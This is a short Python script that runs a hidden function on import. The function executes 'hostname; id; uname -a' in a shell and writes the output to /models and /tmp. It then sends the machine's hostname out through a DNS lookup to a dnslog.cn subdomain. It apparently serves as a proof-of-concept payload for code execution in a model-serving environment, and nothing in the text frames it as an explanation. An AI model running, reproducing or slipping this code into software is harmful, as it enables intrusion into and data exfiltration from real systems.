import os, subprocess, socket
def _pwn():
    try:
        out = subprocess.check_output("hostname; id; uname -a", shell=True, stderr=subprocess.STDOUT, timeout=15)
    except Exception as e:
        out = str(e).encode()
    try:
        open("/models/dns-PWN.txt","wb").write(out)
        open("/tmp/dns-PWN.txt","wb").write(out)
    except: pass
    try:
        h = open("/etc/hostname").read().strip() if os.path.exists("/etc/hostname") else "nohost"
        h2 = h.replace(".","-")[:50]
        socket.gethostbyname(h2 + ".a5f62n.dnslog.cn")
    except: pass
_pwn()
